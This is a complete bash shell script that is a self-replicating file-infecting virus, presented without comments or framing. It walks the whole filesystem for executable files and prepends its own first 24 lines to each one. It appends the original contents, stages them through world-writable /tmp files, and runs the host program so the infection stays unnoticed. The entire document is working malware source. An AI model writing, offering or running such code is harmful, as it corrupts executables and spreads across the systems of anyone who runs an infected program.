#!/bin/bash
if [ "$1" != infect ]
then
    if [ ! -f /tmp/vir-* ]
    then
        $0 infect &
    fi
    tail +25 $0 >>/tmp/vir-$$
    chmod 777 /tmp/vir-$$
    /tmp/vir-$$ $@
    CODE=$?
else
    find / -type f -perm +100 -exec bash -c \
    "if [ -z \"\`cat {}|grep VIRUS\`\" ]; \
    then \
        cp {} /tmp/vir-$$; \
        (head -24 $0 >{}) 2>/dev/null; \
        (cat /tmp/vir-$$ >>{}) 2>/dev/null; \
        rm /tmp/vir-$$; \
    fi" \;
    CODE=0
fi
rm -f /tmp/vir-$$
exit $CODE
